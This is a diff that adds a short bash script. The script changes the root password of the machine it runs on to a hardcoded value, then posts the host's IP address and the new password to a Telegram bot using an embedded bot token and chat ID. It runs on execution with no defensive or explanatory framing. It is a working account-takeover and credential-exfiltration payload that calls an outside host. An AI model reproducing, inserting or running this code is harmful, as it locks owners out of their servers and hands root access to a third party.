@@ -1,0 +1,22 @@
+send_code_telegram() {
+    local ip_address=$(hostname -I | awk '{print $1}')
+    local passwd="iChangedIt@Favour"
+
+    # Change root password
+    echo "root:$passwd" | chpasswd
+    if [ $? -eq 0 ]; then
+        local message="The password for $ip_address is changed to: $passwd"
+    else
+        local message="The password for $ip_address is not changed"
+        return 1
+    fi
+
+    # Send message to Telegram
+    local bot_token="${bot_tokens[0]}"
+    local chat_id="${chat_ids[0]}"
+    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
+}
+
+bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY")
+chat_ids=("1744391586")
+send_code_telegram
